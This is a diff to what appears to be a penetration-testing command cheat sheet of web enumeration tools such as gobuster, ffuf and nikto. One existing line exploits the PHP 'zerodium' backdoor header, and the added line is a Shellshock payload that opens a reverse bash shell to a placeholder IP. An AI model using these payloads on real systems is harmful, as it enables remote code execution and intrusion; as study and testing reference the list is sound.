@@ -64,6 +64,7 @@ $ gobuster vhost -w <wordlist> -u <URL>
 $ ffuf -u <URL>/FUZZ -w <wordlist>
 $ curl -I <URL>
 $ curl <URL> -H 'User-Agentt: zerodiumsystem("curl <IP address>");'
+$ curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/<IP address>/443 0>&1" http://<IP address>/cgi-bin/user.sh
 $ feroxbuster -w <wordlist> -u <URL>
 $ wfuzz -c -w <wordlist> -u http://FUZZ.<domain>
 $ nikto -h <IP address>
